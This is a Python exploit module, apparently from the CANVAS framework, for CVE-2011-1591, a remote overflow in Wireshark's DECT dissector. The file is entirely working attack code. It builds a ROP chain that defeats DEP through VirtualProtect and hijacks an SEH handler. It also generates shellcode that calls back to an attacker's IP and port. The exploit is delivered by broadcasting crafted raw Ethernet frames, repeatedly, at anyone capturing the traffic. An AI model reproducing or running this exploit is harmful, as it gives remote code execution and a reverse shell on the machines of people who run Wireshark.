#!/usr/bin/env python

import sys
if '.' not in sys.path:
    sys.path.append('.')

import struct
import time
import string

from exploitutils import *
from canvasexploit import canvasexploit
from tcpexploit import *
from libs.canvasos import *
from socket import *

from ExploitTypes.localexploit import LocalExploit

NAME                      = 'Wireshark DECT Dissector Remote Overflow'
DESCRIPTION               = 'Remote overflow in DECT dissector'
VERSION                   = '0'
DOCUMENTATION             = {}
DOCUMENTATION['Notes']    = 'Tested on Wireshark 1.4.4 on WinXP'
DOCUMENTATION['CVE Name'] = 'CVE-2011-1591'
DOCUMENTATION['CVE Url']  = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1591'
PROPERTY                  = {}
PROPERTY['TYPE']          = 'Exploit'
PROPERTY['SITE']          = 'Remote'
PROPERTY['ARCH']          = [ ["Windows"] ]

NOTES = """
commandlineInterface.py -p 5555 -v 0
sudo python exploits/wireshark_dect/wireshark_dect.py -l 172.16.169.1 -d 5555
"""

def p(dword):
    return struct.pack("<L",dword)

def write4(dword):
    ret  = struct.pack("<L", 0x61848E7A)     # pop edx
    ret += struct.pack("<L", dword)
    ret += struct.pack("<L", 0x685C3E19)     # MOV DWORD PTR DS:[EAX],EDX
    ret += struct.pack("<L", 0xFFFFFFFF)     #
    ret += struct.pack("<L", 0x685F3759) * 4 # inc eax
    return ret

def writeString(s):
    ret = ''
    i = len(s)
    for dword in splitString(s):
        ret += struct.pack("<L", 0x61848E7A)     # pop edx
        ret += struct.pack("4s", dword)
        ret += struct.pack("<L", 0x685C3E19)     # MOV DWORD PTR DS:[EAX],EDX
        ret += struct.pack("<L", 0xFFFFFFFF)     #
        if i != 4:
            ret += struct.pack("<L", 0x685F3759) * 4 # inc eax
        i -= 4
    return ret

def splitString(s):
    ret = []
    s = list(s)
    i=0
    while len(s)%4 != 0:
        s += "\x00"
    for dword in range(len(s)/4):
        ret.append(''.join(s[i:i+4]))
        i +=4
    return ret

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.interface      = 'vmnet1'
        self.dstAddr        = '\xff\xff\xff\xff\xff\xff'
        self.loop           = True
        self.loopInterval   = 10
        self.use_local_interface = False

    def neededListenerTypes(self):
        from canvasengine import UNIVERSAL_MOSDEF
        return [UNIVERSAL_MOSDEF]

    def createWin32Shellcode(self,badstring,localhost,localport,rawshellcode=None):
        self.shellcode = self.createInjectToSelf(self.callback.ip, self.callback.port,
                                                 universal=True)
        return 1

    def createShellcode(self):
        self.searchbadstring = ''
        self.createWin32SearchShellcode(self.callback.ip, self.callback.port)

    def depChain(self):
        retSlide = "A" * 3           # Align ret slide
        retSlide += p(0x685F375A)*18 # Deal with differents stackframes sizes (win7/xp)

        ethData = retSlide
        ethData += p(0x685F6904)     # pop eax
        ethData += p(0x6869D458)     # ->GetModuleHandleA
        ethData += p(0x685C3E07)     # mov eax, [eax]
        ethData += p(0x685C305B)     # jmp eax
        ethData += p(0x685F375A)     # ret
        ethData += p(0x6868b25e)     # pModuleName -> libglib; ASCII "kernel32.dll"

        ''' Stack for GetProcAddress '''
        self.stackAddr = 0x68692334
        ethData += p(0x685DE38B)        # pop edx
        ethData += p(self.stackAddr)    #
        ethData += p(0xFFFFFFFF)*2      #
        ethData += p(0x685EF2D4)        # MOV DWORD PTR DS:[EDX],EAX -> handle
        ethData += p(0xFFFFFFFF)*3      #
        ethData += p(0x685F6904)        # pop eax
        ethData += p(self.stackAddr+8)  # -> ptr to string
        ethData += p(0x685DE38B)        # pop edx
        ethData += p(self.stackAddr+4)  # buffer
        ethData += p(0xFFFFFFFF)*2      #
        ethData += p(0x685EF2D4)        # MOV DWORD PTR DS:[EDX],EAX -> ptrString
        ethData += p(0xFFFFFFFF)*3
        ethData += p(0x685F6904)        # pop eax
        ethData += p(self.stackAddr+8)  #

        if len(ethData) <= 179:                  # Fill until we write the invalid pointer
            while len(ethData) < 179:
                ethData += p(0x685F375A)
        else:
            self.log('Invalid pointer was already overwritten... Might crash in other location')
            return None

        ethData += p(0x685D1ADA)    # pop ebp, ret
        ethData += p(0xEEEEEEEE)    # Exception trigger
        ethData += writeString('VirtualProtect')
        ethData += p(0x68626327)    # push esp, pop ebx, pop ebp, ret
        ethData += p(0xFFFFFFFF)
        ethData += p(0x617F4391)    # xhg ebx,eax
        ethData += p(0x685DE38B)    # pop edx
        ethData += p(0x68692354)    # our buffer
        ethData += p(0xFFFFFFFF)*2  #
        ethData += p(0x685EF2D4)    # MOV DWORD PTR DS:[EDX],EAX
        ethData += p(0xFFFFFFFF)*3  #


        ethData += p(0x685F6904)         # pop eax
        ethData += p(0x68692300)         # buffer

        ethData += write4(0x685DE38B)    # pop edx
        ethData += write4(0x68692000)    #
        ethData += write4(0xFFFFFFFF)*2  #
        ethData += write4(0x685EF2D4)    # MOV DWORD PTR DS:[EDX],EAX -> handle
        ethData += write4(0xFFFFFFFF)*3  #

        # Call GetProcAddress
        ethData += write4(0x685F6904)    # pop eax
        ethData += write4(0x6869D460)    # their wrapper to ->GetProcAddress
        ethData += write4(0x685C3E07)    # mov eax, [eax]
        ethData += write4(0x685C305B)    # jmp eax
        ethData += write4(0x685C12AA)    # pop,pop,pop,pop,ret
        ethData += p(0x685F3759)*24
        ethData += write4(0x685C305B)     # jmp eax
        ethData += write4(0x685F375A)     # ret
        ethData += p(0x685F3759)*4        # addr
        ethData += write4(0x00001400)     # Size
        ethData += write4(0x00000040)     # MEM_COMMIT
        ethData += write4(0x68692020)     # PAGE_EXECUTE_READWRITE
        #return
        ethData += write4(0x685F6904)     # pop eax
        ethData += write4(0x68692000)     # ->SavedEBP
        ethData += write4(0x685C3E07)     # mov eax, [eax]
        ethData += write4(0x685D7F8F)     # XCHG EAX,ESP

        ethData += p(0x685F6904)     # pop eax
        ethData += p(0x68692300)     # buffer
        ethData += p(0x685D7F8F)     # XCHG EAX,ESP

        while len(ethData) < 1239:
            ethData += p(0x685F375A)
        ethData += p(0x685D1ADA)                # pop ebp, ret
        ethData += p(0x68606D5B)                # SE Handler
        ethData += p(0x6862D1AA)                #
        ethData += self.searchcode

        if len(ethData) >= 1500:
            self.log('DEP chain packet is too big...Aborting')
            return None
        return ethData

    def sendRaw(self,data,proto):
        s = socket(AF_PACKET, SOCK_RAW, proto)
        s.bind((self.interface, proto))
        ifName,ifProto,pktType,hwType,hwAddr = s.getsockname()
        srcAddr = hwAddr
        dstAddr = self.dstAddr
        txFrame = struct.pack("!6s6sh",dstAddr,srcAddr,proto) + data
        self.log('txFrame length: %d' %len(txFrame))
        s.send(txFrame)
        s.close()

    def getArgs(self):
        self.interface    = self.argsDict.get('interfaceName', self.interface)
        self.loopInterval = self.argsDict.get('loopInterval',  self.loopInterval)
        self.loop         = self.argsDict.get('loop', self.loop)

    def run(self):
        self.getArgs()
        try:
            if self.loop == True:
                self.log('Sending DECT packets every %d seconds' %self.loopInterval)

                while self.state != self.HALT:
                    self.log('Sending packet with shellcode...')
                    self.sendRaw(self.shellcode,0x5005)
                    time.sleep(5)
                    self.log('Sending DECT packet...')
                    self.sendRaw(self.depChain(),0x2323)
                    time.sleep(self.loopInterval)
                    if self.ISucceeded():
                        self.log('Success!')
                        return 1
                self.log('Halted!')
            else:
                self.log('Sending packet with shellcode...')
                self.sendRaw(self.shellcode,0x5005)
                time.sleep(5)
                self.log('Sending DECT packet...')
                self.sendRaw(self.depChain(),0x2323)
                time.sleep(self.loopInterval)
                if self.ISucceeded():
                    self.log('Success!')
                    return 1

        except Exception, ex:
            self.log('Make sure you have SOCK_RAW permissions, run as root')
            self.log('Error: %s' % ex)
            return 0

        return 0

if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()

    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
